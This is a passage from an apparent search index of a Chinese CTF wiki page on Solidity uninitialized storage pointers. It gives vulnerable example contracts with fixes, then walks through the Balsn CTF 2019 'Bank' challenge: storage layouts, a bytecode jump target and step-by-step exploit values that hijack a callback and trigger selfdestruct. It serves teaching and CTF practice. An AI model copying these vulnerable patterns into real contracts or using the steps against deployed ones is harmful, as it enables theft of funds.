\u5c42\u9762\u4e5f\u589e\u52a0\u4e86\u53c2\u6570\u683c\u5f0f\u6821\u9a8c\u3002\u867d\u7136 EVM \u5c42\u4ecd\u7136\u53ef\u4ee5\u590d\u73b0\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u5e94\u7528\u573a\u666f\u4e2d\u57fa\u672c\u6ca1\u6709\u95ee\u9898\u3002","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/","text":"Uninitialized Storage Pointer \u00b6 \u539f\u7406 \u00b6 \u672a\u521d\u59cb\u5316\u7684\u5b58\u50a8\u6307\u9488\u662f\u6307\u5728 EVM \u4e2d\u672a\u8fdb\u884c\u521d\u59cb\u5316\u7684 storage \u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u4f1a\u6307\u5411\u5176\u4ed6\u53d8\u91cf\u7684\u533a\u57df\uff0c\u4ece\u800c\u66f4\u6539\u5176\u4ed6\u53d8\u91cf\u7684\u503c\u3002 \u4f8b\u5b50 \u00b6 \u5178\u578b\u4f8b\u5b50 \u00b6 \u6211\u4eec\u6765\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff1a pragma solidity ^ 0.4.24 ; contract example1 { uint public a ; address public b ; struct Wallet { uint value ; address addr ; } function setValue ( uint _a , address _b ) public { a = _a ; b = _b ; } function attack ( uint _value , address _addr ) public { Wallet wallet ; wallet . value = _value ; wallet . addr = _addr ; } } \u5c06\u8fd9\u4efd\u4ee3\u7801\u653e\u5165 Remix \u4e2d\uff0c\u5b83\u4f1a\u63d0\u793a Uninitialized Storage Pointer\uff1a \u5728\u6211\u4eec\u90e8\u7f72\u540e\uff0c\u9996\u5148\u4f7f\u7528 setValue \u51fd\u6570\u5c06 a \u548c b \u7684\u503c\u5206\u522b\u8bbe\u4e3a 1 \u548c 0x10aA1C20aD710B823f8c1508cfC12D5d1199117E\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0\u8bbe\u7f6e\u6210\u529f\uff1a \u7136\u540e\u6211\u4eec\u8c03\u7528 attack \u51fd\u6570\uff0c\u4f20\u5165\u7684 _value \u548c _addr \u503c\u5206\u522b\u4e3a 2 \u548c 0xa3b0D4BBF17F38e00F68Ce73f81D122FB1374ff6\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0 a \u548c b \u88ab\u4f20\u5165\u7684 _value \u548c _addr \u503c\u8986\u76d6\u4e86\uff1a \u8fd9\u4e2a\u4f8b\u5b50\u7684\u4fee\u590d\u65b9\u6848\u662f\u4f7f\u7528 mapping \u8fdb\u884c\u7ed3\u6784\u4f53\u7684\u521d\u59cb\u5316\uff0c\u5e76\u4f7f\u7528 storage \u8fdb\u884c\u62f7\u8d1d\uff1a pragma solidity ^ 0.4.24 ; contract example1 { uint public a ; address public b ; struct Wallet { uint value ; address addr ; } mapping ( uint => Wallet ) wallets ; function setValue ( uint _a , address _b ) public { a = _a ; b = _b ; } function fix ( uint _id , uint _value , address _addr ) public { Wallet storage wallet = wallets [ _id ]; wallet . value = _value ; wallet . addr = _addr ; } } \u4e0d\u4ec5\u4ec5\u662f struct \u4f1a\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\uff0c\u6570\u7ec4\u4e5f\u6709\u540c\u6837\u7684\u95ee\u9898\u3002\u6211\u4eec\u6765\u770b\u4e0b\u9762\u7684\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff1a pragma solidity ^ 0.4.24 ; contract example2 { uint public a ; uint [] b ; function setValue ( uint _a ) public { a = _a ; } function attack ( uint _value ) public { uint [] tmp ; tmp . push ( _value ); b = tmp ; } } \u5c06\u8fd9\u4efd\u4ee3\u7801\u653e\u5165 Remix \u4e2d\uff0c\u5b83\u4e5f\u4f1a\u63d0\u793a Uninitialized Storage Pointer\uff1a \u5728\u6211\u4eec\u90e8\u7f72\u540e\uff0c\u9996\u5148\u4f7f\u7528 setValue \u51fd\u6570\u5c06 a \u7684\u503c\u8bbe\u4e3a 1\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0\u8bbe\u7f6e\u6210\u529f\uff1a \u7136\u540e\u6211\u4eec\u8c03\u7528 attack \u51fd\u6570\uff0c\u4f20\u5165\u7684 _value \u503c\u4e3a 2\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0 a \u88ab\u4f20\u5165\u7684 _value\u503c\u8986\u76d6\u4e86\uff1a \u8fd9\u4e2a\u4f8b\u5b50\u7684\u4fee\u590d\u65b9\u6848\u662f\u5728\u58f0\u660e\u5c40\u90e8\u53d8\u91cf tmp \u7684\u65f6\u5019\u5bf9\u5b83\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\uff1a pragma solidity ^ 0.4.24 ; contract example2 { uint public a ; uint [] b ; function setValue ( uint _a ) public { a = _a ; } function fix ( uint _value ) public { uint [] tmp = b ; tmp . push ( _value ); } } 2019 BalsnCTF Bank \u00b6 \u4ee5 2019 Balsn CTF \u7684 Bank \u7684 WP \u4f5c\u4e3a\u53c2\u8003\uff0c\u8bb2\u89e3\u4e00\u4e0b\u672a\u521d\u59cb\u5316\u7684\u5b58\u50a8\u6307\u9488\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u9898\u76ee\u5408\u7ea6\u7684\u6e90\u7801\u5982\u4e0b\uff1a pragma solidity ^ 0.4.24 ; contract Bank { event SendEther ( address addr ); event SendFlag ( address addr ); address public owner ; uint randomNumber = 0 ; constructor () public { owner = msg.sender ; } struct SafeBox { bool done ; function ( uint , bytes12 ) internal callback ; bytes12 hash ; uint value ; } SafeBox [] safeboxes ; struct FailedAttempt { uint idx ; uint time ; bytes12 triedPass ; address origin ; } mapping ( address => FailedAttempt []) failedLogs ; modifier onlyPass ( uint idx , bytes12 pass ) { if ( bytes12 ( sha3 ( pass )) != safeboxes [ idx ]. hash ) { FailedAttempt info ; info . idx = idx ; info . time = now ; info . triedPass = pass ; info . origin = tx.origin ; failedLogs [ msg.sender ]. push ( info ); } else { _ ; } } function deposit ( bytes12 hash ) payable public returns ( uint ) { SafeBox box ; box . done = false ; box . hash = hash ; box . value = msg.value ; if ( msg.sender == owner ) { box . callback = sendFlag ; } else { require ( msg.value >= 1 ether ); box . value -= 0 . 01 ether ; box . callback = sendEther ; } safeboxes . push ( box ); return safeboxes . length - 1 ; } function withdraw ( uint idx , bytes12 pass ) public payable { SafeBox box = safeboxes [ idx ]; require ( ! box . done ); box . callback ( idx , pass ); box . done = true ; } function sendEther ( uint idx , bytes12 pass ) internal onlyPass ( idx , pass ) { msg.sender . transfer ( safeboxes [ idx ]. value ); emit SendEther ( msg.sender ); } function sendFlag ( uint idx , bytes12 pass ) internal onlyPass ( idx , pass ) { require ( msg.value >= 100000000 ether ); emit SendFlag ( msg.sender ); selfdestruct ( owner ); } } \u6211\u4eec\u7684\u76ee\u6807\u662f\u8981\u6267\u884c emit SendFlag(msg.sender)\uff0c\u5f88\u660e\u663e\u4e0d\u80fd\u901a\u8fc7 sendFlag \u51fd\u6570\u6765\u89e6\u53d1\uff0c\u56e0\u4e3a\u6211\u4eec\u80af\u5b9a\u4e0d\u80fd\u6ee1\u8db3 msg.value >= 100000000 ether\u3002 \u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u89c2\u5bdf\u4ee3\u7801\uff0c\u4f1a\u53d1\u73b0\u6709\u4e24\u5904\u672a\u521d\u59cb\u5316\u7684\u5b58\u50a8\u6307\u9488\uff1a modifier onlyPass ( uint idx , bytes12 pass ) { [...] FailedAttempt info ; <-- [...] } function deposit ( bytes12 hash ) payable public returns ( uint ) { [...] SafeBox box ; <-- [...] } \u90a3\u4e48\u6211\u4eec\u9700\u8981\u601d\u8003\u5982\u4f55\u5229\u7528\u5b83\u4eec\u3002\u6211\u4eec\u9996\u5148\u6765\u770b\u770b\u5408\u7ea6\u521a\u521b\u5efa\u7684\u65f6\u5019\u7684 slot \u7684\u5e03\u5c40\uff1a ----------------------------------------------------- | unused (12) | owner (20) | <- slot 0 ----------------------------------------------------- | randomNumber (32) | <- slot 1 ----------------------------------------------------- | safeboxes.length (32) | <- slot 2 ----------------------------------------------------- | occupied by failedLogs but unused (32) | <- slot 3 ----------------------------------------------------- onlyPass \u4e2d\u7684 FailedAttempt \u7684\u5e03\u5c40\u5982\u4e0b\uff0c\u5b83\u4f1a\u8986\u76d6\u539f\u5148\u7684 slot0 \u5230 slot2 \u7684\u5185\u5bb9\uff1a ----------------------------------------------------- | idx (32) | ----------------------------------------------------- | time (32) | ----------------------------------------------------- | tx.origin (20) | triedPass (12) | ----------------------------------------------------- deposit \u4e2d\u7684 SafeBox \u7684\u5e03\u5c40\u5982\u4e0b\uff0c\u5b83\u4f1a\u8986\u76d6\u539f\u5148\u7684 slot0 \u5230 slot1 \u7684\u5185\u5bb9\uff1a ----------------------------------------------------- | unused (11) | hash (12) | callback (8) | done (1) | ----------------------------------------------------- | value (32) | ----------------------------------------------------- \u5982\u679c\u5f53 FailedAttempt \u4e2d\u7684 tx.origin \u8db3\u591f\u5927\u7684\u65f6\u5019\uff0c\u5c31\u53ef\u4ee5\u8986\u76d6 safeboxes.length \u5e76\u628a\u5b83\u4e5f\u6539\u6210\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u503c\uff0c\u8fd9\u6837\u5728\u8c03\u7528 withdraw \u51fd\u6570\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u5c06\u8bbf\u95ee\u5230 failedLogs\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236 callback \u4e3a\u4efb\u610f\u7684\u5185\u5bb9\u5e76\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002 \u90a3\u4e48\u6211\u4eec\u9700\u8981\u63a7\u5236\u6267\u884c\u6d41\u5230\u4ec0\u4e48\u5730\u65b9\u5462\uff1f\u5728 opcodes \u90a3\u8282\u4ecb\u7ecd\u8fc7\uff0c\u8df3\u8f6c\u6307\u4ee4\u53ea\u80fd\u8df3\u8f6c\u5230 JUMPDEST \u5904\uff0c\u6211\u4eec\u9700\u8981\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u8df3\u8f6c\u5230 emit SendFlag(msg.sender) \u524d\u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u662f\u4e0b\u9762\u6240\u793a\u7684 070F \u5904\uff1a 06F6 6A PUSH11 0x52b7d2dcc80cd2e4000000 0702 34 CALLVALUE 0703 10 LT 0704 15 ISZERO 0705 15 ISZERO 0706 15 ISZERO 0707 61 PUSH2 0x070f 070A 57 JUMPI 070B 60 PUSH1 0x00 070D 80 DUP1 070E FD REVERT 070F 5B JUMPDEST <---- here 0710 7F PUSH32 0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579 0731 33 CALLER 0732 60 PUSH1 0x40 0734 51 MLOAD 0735 80 DUP1 0736 82 DUP3 \u6700\u540e\u6211\u4eec\u6765\u63cf\u8ff0\u4e00\u4e0b\u653b\u51fb\u7684\u5177\u4f53\u6b65\u9aa4\uff1a \u5bfb\u627e\u4e00\u4e2a address \u5f00\u5934\u8f83\u5927\u7684\u8d26\u6237\uff0c\u4e4b\u540e\u7684\u64cd\u4f5c\u90fd\u7528\u8be5\u8d26\u6237\u8fdb\u884c\u3002 \u7531\u4e8e failedLogs \u662f mapping \u52a0\u4e0a\u6570\u7ec4\u7684\u5f62\u5f0f\uff0c\u6240\u4ee5\u8ba1\u7b97 target = keccak256(keccak256(msg.sender||3)) + 2 \u7684\u503c\uff0c\u4e5f\u5c31\u662f failedLogs[msg.sender][0] \u4e2d\u7684 tx.origin | triedPass \u7684 slot \u4f4d\u7f6e\u3002 \u8ba1\u7b97 safeboxes \u6570\u7ec4\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u6240\u5728\u7684 slot \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f base = keccak256(2) \u3002 \u8ba1\u7b97 target \u5728 safeboxes \u6570\u7ec4\u4e2d\u7684\u7d22\u5f15\uff0c\u7531\u4e8e safeboxes \u6570\u7ec4\u4e2d\u4e00\u4e2a\u5143\u7d20\u4f1a\u5360\u636e\u4e24\u4e2a slot\uff0c\u6240\u4ee5\u8ba1\u7b97\u51fa\u6765\u4e3a idx = (target - base) // 2 \u3002 \u5224\u65ad (target - base) % 2 \u662f\u5426\u4e3a 0\uff0c\u5982\u679c\u662f\u5219 tx.origin | triedPass \u521a\u597d\u53ef\u4ee5\u8986\u76d6\u5230 unused | hash | callback | done\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236\u5230 callback\uff1b\u5426\u5219\u8fd4\u56de\u7b2c\u4e00\u6b65\u3002 \u5224\u65ad (msg.sender << (12 * 8)) \u662f\u5426\u5927\u4e8e idx\uff0c\u5982\u679c\u662f\u5219 safeboxes \u53ef\u4ee5\u8bbf\u95ee\u5230 target \u5904\uff1b\u5426\u5219\u8fd4\u56de\u7b2c\u4e00\u6b65\u3002 \u8c03\u7528 deposit \u51fd\u6570\uff0c\u8bbe\u7f6e\u4f20\u5165\u7684 hash \u503c\u4e3a 0x000000000000000000000000 \u5e76\u9644\u5e26 1 ether\uff0c\u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u8bbe\u7f6e safeboxes[0].callback = sendEther\u3002 \u8c03\u7528 withdraw \u51fd\u6570\uff0c\u8bbe\u7f6e\u4f20\u5165\u7684 idx \u503c\u4e3a 0\uff0cpass \u503c\u4e3a 0x111111111111110000070f00\uff0c\u7531\u4e8e\u4e0a\u4e00\u6b65\u6211\u4eec\u8bbe\u7f6e\u4e86 safeboxes[0].callback = sendEther\uff0c\u90a3\u4e48\u8fd9\u4e00\u6b65\u4fbf\u4f1a\u8c03\u7528 sendEther \u51fd\u6570\uff0c\u8fdb\u800c\u8d70\u5230 onlyPass \u4e2d\u7684 if \u5206\u652f\u4e2d\uff0c\u4f7f\u5f97 failedLogs[msg.sender][0] \u4e2d\u7684 triedPass \u88ab\u4fee\u6539\u4e3a\u4e86\u6211\u4eec\u4f20\u5165\u7684 pass \u503c\uff0c\u540c\u65f6\u8fd9\u6b65\u64cd\u4f5c\u4e5f\u4fee\u6539\u4e86 safeboxes.length \u4e3a msg.sender | pass\u3002 \u8c03\u7528 withdraw \u51fd\u6570\uff0c\u8bbe\u7f6e\u4f20\u5165\u7684 idx \u503c\u4e3a\u6211\u4eec\u5728\u7b2c\u56db\u6b65\u4e2d\u6240\u8ba1\u7b97\u51fa\u7684 idx \u503c\uff0cpass \u503c\u4e3a 0x000000000000000000000000\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6267\u884c\u6d41\u4fbf\u4f1a\u8df3\u8f6c\u5230 emit SendFlag(msg.sender) \u7ee7\u7eed\u6267\u884c\uff0c\u6700\u7ec8\u76ee\u6807\u5408\u7ea6\u4f1a\u81ea\u6bc1\uff0c\u653b\u51fb\u6210\u529f\u3002 Note \u6ce8\uff1a\u653b\u51fb\u6b65\u9aa4\u4e2d\u7684 slot \u8ba1\u7b97\u89c4\u5219\u53ef\u4ee5\u5728 Ethereum Storage \u8282\u4e2d\u67e5\u770b\u3002 \u9898\u76ee \u00b6 Balsn 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Bank RCTF 2020 \u00b6 \u9898\u76ee\u540d\u79f0 roiscoin Byte 2019 \u00b6 \u9898\u76ee\u540d\u79f0 hf \u6570\u5b57\u7ecf\u6d4e\u5927\u8d5b 2019 \u00b6 \u9898\u76ee\u540d\u79f0 cow \u9898\u76ee\u540d\u79f0 rise Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002 \u53c2\u8003 \u00b6 \u4ee5\u592a\u574a Solidity \u672a\u521d\u59cb\u5316\u5b58\u50a8\u6307\u9488\u5b89\u5168\u98ce\u9669\u6d45\u6790 Balsn CTF 2019 - Bank","title":"Uninitialized Storage Pointer"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#uninitialized-storage-pointer","text":"","title":"Uninitialized Storage Pointer"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#_1","text":"\u672a\u521d\u59cb\u5316\u7684\u5b58\u50a8\u6307\u9488\u662f\u6307\u5728 EVM \u4e2d\u672a\u8fdb\u884c\u521d\u59cb\u5316\u7684 storage \u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u4f1a\u6307\u5411\u5176\u4ed6\u53d8\u91cf\u7684\u533a\u57df\uff0c\u4ece\u800c\u66f4\u6539\u5176\u4ed6\u53d8\u91cf\u7684\u503c\u3002","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#_2","text":"","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#_3","text":"\u6211\u4eec\u6765\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\uff1a pragma solidity ^ 0.4.24 ; contract example1 { uint public a ; address public b ; struct Wallet { uint value ; address addr ; } function setValue ( uint _a , address _b ) public { a = _a ; b = _b ; } function attack ( uint _value , address _addr ) public { Wallet wallet ; wallet . value = _value ; wallet . addr = _addr ; } } \u5c06\u8fd9\u4efd\u4ee3\u7801\u653e\u5165 Remix \u4e2d\uff0c\u5b83\u4f1a\u63d0\u793a Uninitialized Storage Pointer\uff1a \u5728\u6211\u4eec\u90e8\u7f72\u540e\uff0c\u9996\u5148\u4f7f\u7528 setValue \u51fd\u6570\u5c06 a \u548c b \u7684\u503c\u5206\u522b\u8bbe\u4e3a 1 \u548c 0x10aA1C20aD710B823f8c1508cfC12D5d1199117E\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0\u8bbe\u7f6e\u6210\u529f\uff1a \u7136\u540e\u6211\u4eec\u8c03\u7528 attack \u51fd\u6570\uff0c\u4f20\u5165\u7684 _value \u548c _addr \u503c\u5206\u522b\u4e3a 2 \u548c 0xa3b0D4BBF17F38e00F68Ce73f81D122FB1374ff6\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0 a \u548c b \u88ab\u4f20\u5165\u7684 _value \u548c _addr \u503c\u8986\u76d6\u4e86\uff1a \u8fd9\u4e2a\u4f8b\u5b50\u7684\u4fee\u590d\u65b9\u6848\u662f\u4f7f\u7528 mapping \u8fdb\u884c\u7ed3\u6784\u4f53\u7684\u521d\u59cb\u5316\uff0c\u5e76\u4f7f\u7528 storage \u8fdb\u884c\u62f7\u8d1d\uff1a pragma solidity ^ 0.4.24 ; contract example1 { uint public a ; address public b ; struct Wallet { uint value ; address addr ; } mapping ( uint => Wallet ) wallets ; function setValue ( uint _a , address _b ) public { a = _a ; b = _b ; } function fix ( uint _id , uint _value , address _addr ) public { Wallet storage wallet = wallets [ _id ]; wallet . value = _value ; wallet . addr = _addr ; } } \u4e0d\u4ec5\u4ec5\u662f struct \u4f1a\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\uff0c\u6570\u7ec4\u4e5f\u6709\u540c\u6837\u7684\u95ee\u9898\u3002\u6211\u4eec\u6765\u770b\u4e0b\u9762\u7684\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff1a pragma solidity ^ 0.4.24 ; contract example2 { uint public a ; uint [] b ; function setValue ( uint _a ) public { a = _a ; } function attack ( uint _value ) public { uint [] tmp ; tmp . push ( _value ); b = tmp ; } } \u5c06\u8fd9\u4efd\u4ee3\u7801\u653e\u5165 Remix \u4e2d\uff0c\u5b83\u4e5f\u4f1a\u63d0\u793a Uninitialized Storage Pointer\uff1a \u5728\u6211\u4eec\u90e8\u7f72\u540e\uff0c\u9996\u5148\u4f7f\u7528 setValue \u51fd\u6570\u5c06 a \u7684\u503c\u8bbe\u4e3a 1\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0\u8bbe\u7f6e\u6210\u529f\uff1a \u7136\u540e\u6211\u4eec\u8c03\u7528 attack \u51fd\u6570\uff0c\u4f20\u5165\u7684 _value \u503c\u4e3a 2\uff0c\u53ef\u4ee5\u4ece\u4ea4\u6613\u4e2d\u53d1\u73b0 a \u88ab\u4f20\u5165\u7684 _value\u503c\u8986\u76d6\u4e86\uff1a \u8fd9\u4e2a\u4f8b\u5b50\u7684\u4fee\u590d\u65b9\u6848\u662f\u5728\u58f0\u660e\u5c40\u90e8\u53d8\u91cf tmp \u7684\u65f6\u5019\u5bf9\u5b83\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\uff1a pragma solidity ^ 0.4.24 ; contract example2 { uint public a ; uint [] b ; function setValue ( uint _a ) public { a = _a ; } function fix ( uint _value ) public { uint [] tmp = b ; tmp . push ( _value ); } }","title":"\u5178\u578b\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/uninitialized-storage-pointer/#2019-balsnctf-bank","text":"\u4ee5 2019 Balsn CTF \u7684 Bank \u7684 WP \u4f5c\u4e3a\u53c2\u8003\uff0c\u8bb2\u89e3\u4e00\u4e0b\u672a\u521d\u59cb\u5316\u7684\u5b58\u50a8\u6307\u9488\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u9898\u76ee\u5408\u7ea6\u7684\u6e90\u7801\u5982\u4e0b\uff1a pragma solidity ^ 0.4.24 ; contract Bank { event SendEther ( address addr ); event SendFlag ( address addr ); address public owner ; uint randomNumber = 0 ; constructor () public { owner = msg.sender ; } struct SafeBox { bool done ; function ( uint , bytes12 ) internal callback ; bytes12 hash ; uint value ; } SafeBox [] safeboxes ; struct FailedAttempt { uint idx ; uint time ; bytes12 triedPass ; address origin ; } mapping ( address => FailedAttempt []) failedLogs ; modifier onlyPass ( uint idx , bytes12 pass ) { if ( bytes12 ( sha3 ( pass )) != safeboxes [ idx ]. hash ) { FailedAttempt info ; info . idx = idx ; info . time = now ; info . triedPass = pass ; info . origin = tx.origin ; failedLogs [ msg.sender ]. push ( info ); } else { _ ; } } function deposit ( bytes12 hash ) payable public returns ( uint ) { SafeBox box ; box . done = false ; box . hash = hash ; box . value = msg.value ; if ( msg.sender == owner ) { box . callback = sendFlag ; } else { require ( msg.value >= 1 ether ); box . value -= 0 . 01 ether ; box . callback = sendEther ; } safeboxes . push ( box ); return safeboxes . length - 1 ; } function withdraw ( uint idx , bytes12 pass ) public payable { SafeBox box = safeboxes [ idx ]; require ( ! box . done ); box . callback ( idx , pass ); box . done = true ; } function sendEther ( uint idx , bytes12 pass ) internal onlyPass ( idx , pass ) { msg.sender . transfer ( safeboxes [ idx ]. value ); emit SendEther ( msg.sender ); } function sendFlag ( uint idx , bytes12 pass ) internal onlyPass ( idx , pass ) { require ( msg.value >= 100000000 ether ); emit SendFlag ( msg.sender ); selfdestruct ( owner ); } } \u6211\u4eec\u7684\u76ee\u6807\u662f\u8981\u6267\u884c emit SendFlag(msg.sender)\uff0c\u5f88\u660e\u663e\u4e0d\u80fd\u901a\u8fc7 sendFlag \u51fd\u6570\u6765\u89e6\u53d1\uff0c\u56e0\u4e3a\u6211\u4eec\u80af\u5b9a\u4e0d\u80fd\u6ee1\u8db3 msg.value >= 100000000 ether\u3002 \u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u89c2\u5bdf\u4ee3\u7801\uff0c\u4f1a\u53d1\u73b0\u6709\u4e24\u5904\u672a\u521d\u59cb\u5316\u7684\u5b58\u50a8\u6307\u9488\uff1a modifier onlyPass ( uint idx , bytes12 pass ) { [...] FailedAttempt info ; <-- [...] } function deposit ( bytes12 hash ) payable public returns ( uint ) { [...] SafeBox box ; <-- [...] } \u90a3\u4e48\u6211\u4eec\u9700\u8981\u601d\u8003\u5982\u4f55\u5229\u7528\u5b83\u4eec\u3002\u6211\u4eec\u9996\u5148\u6765\u770b\u770b\u5408\u7ea6\u521a\u521b\u5efa\u7684\u65f6\u5019\u7684 slot \u7684\u5e03\u5c40\uff1a ----------------------------------------------------- | unused (12) | owner (20) | <- slot 0 ----------------------------------------------------- | randomNumber (32) | <- slot 1 ----------------------------------------------------- | safeboxes.length (32) | <- slot 2 ----------------------------------------------------- | occupied by failedLogs but unused (32) | <- slot 3 ----------------------------------------------------- onlyPass \u4e2d\u7684 FailedAttempt \u7684\u5e03\u5c40\u5982\u4e0b\uff0c\u5b83\u4f1a\u8986\u76d6\u539f\u5148\u7684 slot0 \u5230 slot2 \u7684\u5185\u5bb9\uff1a ----------------------------------------------------- | idx (32) | ----------------------------------------------------- | time (32) | ----------------------------------------------------- | tx.origin (20) | triedPass (12) | ----------------------------------------------------- deposit \u4e2d\u7684 SafeBox \u7684\u5e03\u5c40\u5982\u4e0b\uff0c\u5b83\u4f1a\u8986\u76d6\u539f\u5148\u7684 slot0 \u5230 slot1 \u7684\u5185\u5bb9\uff1a ----------------------------------------------------- | unused (11) | hash (12) | callback (8) | done (1) | ----------------------------------------------------- | value (32) | ----------------------------------------------------- \u5982\u679c\u5f53 FailedAttempt \u4e2d\u7684 tx.origin \u8db3\u591f\u5927\u7684\u65f6\u5019\uff0c\u5c31\u53ef\u4ee5\u8986\u76d6 safeboxes.length \u5e76\u628a\u5b83\u4e5f\u6539\u6210\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u503c\uff0c\u8fd9\u6837\u5728\u8c03\u7528 withdraw \u51fd\u6570\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u5c06\u8bbf\u95ee\u5230 failedLogs\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236 callback \u4e3a\u4efb\u610f\u7684\u5185\u5bb9\u5e76\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002 \u90a3\u4e48\u6211\u4eec\u9700\u8981\u63a7\u5236\u6267\u884c\u6d41\u5230\u4ec0\u4e48\u5730\u65b9\u5462\uff1f\u5728 opcodes \u90a3\u8282\u4ecb\u7ecd\u8fc7\uff0c\u8df3\u8f6c\u6307\u4ee4\u53ea\u80fd\u8df3\u8f6c\u5230 JUMPDEST \u5904\uff0c\u6211\u4eec\u9700\u8981\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u8df3\u8f6c\u5230 emit SendFlag(msg.sender) \u524d\u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u662f\u4e0b\u9762\u6240\u793a\u7684 070F \u5904\uff1a 06F6 6A PUSH11 0x52b7d2dcc80cd2e4000000 0702 34 CALLVALUE 0703 10 LT 0704 15 ISZERO 0705 15 ISZERO 0706 15 ISZERO 0707 61 PUSH2 0x070f 070A 57 JUMPI 070B 60 PUSH1 0x00 070D 80 DUP1 070E FD REVERT 070F 5B JUMPDEST <---- here 0710 7F PUSH32 0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579 0731 33 CALLER 0732 60 PUSH1 0x40 0734 51 MLOAD 0735 80 DUP1 0736 82 DUP3 \u6700\u540e\u6211\u4eec\u6765\u63cf\u8ff0\u4e00\u4e0b\u653b\u51fb\u7684\u5177\u4f53\u6b65\u9aa4\uff1a \u5bfb\u627e\u4e00\u4e2a address \u5f00\u5934\u8f83\u5927\u7684\u8d26\u6237\uff0c\u4e4b\u540e\u7684\u64cd\u4f5c\u90fd\u7528\u8be5\u8d26\u6237\u8fdb\u884c\u3002 \u7531\u4e8e failedLogs \u662f mapping \u52a0\u4e0a\u6570\u7ec4\u7684\u5f62\u5f0f\uff0c\u6240\u4ee5\u8ba1\u7b97 target = keccak256(keccak256(msg.sender||3)) + 2 \u7684\u503c\uff0c\u4e5f\u5c31\u662f failedLogs[msg.sender][0] \u4e2d\u7684 tx.origin | triedPass \u7684 slot \u4f4d\u7f6e\u3002 \u8ba1\u7b97 safeboxes \u6570\u7ec4\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u6240\u5728\u7684 slot \u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f base = keccak256(2) \u3002 \u8ba1\u7b97 target \u5728 safeboxes \u6570\u7ec4\u4e2d\u7684\u7d22\u5f15\uff0c\u7531\u4e8e safeboxes \u6570\u7ec4\u4e2d\u4e00\u4e2a\u5143\u7d20\u4f1a\u5360\u636e\u4e24\u4e2a slot\uff0c\u6240\u4ee5\u8ba1\u7b97\u51fa\u6765\u4e3a idx = (target - base) // 2 \u3002 \u5224\u65ad (target - base) % 2 \u662f\u5426\u4e3a 0\uff0c\u5982\u679c\u662f\u5219 tx.origin | triedPass \u521a\u597d\u53ef\u4ee5\u8986\u76d6\u5230 unused | hash | callback | done\uff0c\u8fdb\u800c\u53ef\u4ee5\u63a7\u5236\u5230 callback\uff1b\u5426\u5219\u8fd4\u56de\u7b2c\u4e00\u6b65\u3002 \u5224\u65ad (msg.sender << (12 * 8)) \u662f\u5426\u5927\u4e8e idx\uff0c\u5982\u679c\u662f\u5219 safeboxes \u53ef\u4ee5\u8bbf\u95ee\u5230 target \u5904\uff1b\u5426\u5219\u8fd4\u56de\u7b2c\u4e00\u6b65\u3002 \u8c03\u7528 deposit \u51fd\u6570\uff0c\u8bbe\u7f6e\u4f20\u5165\u7684 hash \u503c\u4e3a 0x000000000000000000000000 \u5e76\u9644\u5e26 1 ether\uff0c\u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u8bbe\u7f6e safeboxes[0].callback = sendEther\u3002 \u8c03\u7528 withdraw \u51fd\u6570\uff0c\u8bbe\u7f6e\u4f20\u5165\u7684 idx \u503c\u4e3a 0\uff0cpass \u503c\u4e3a 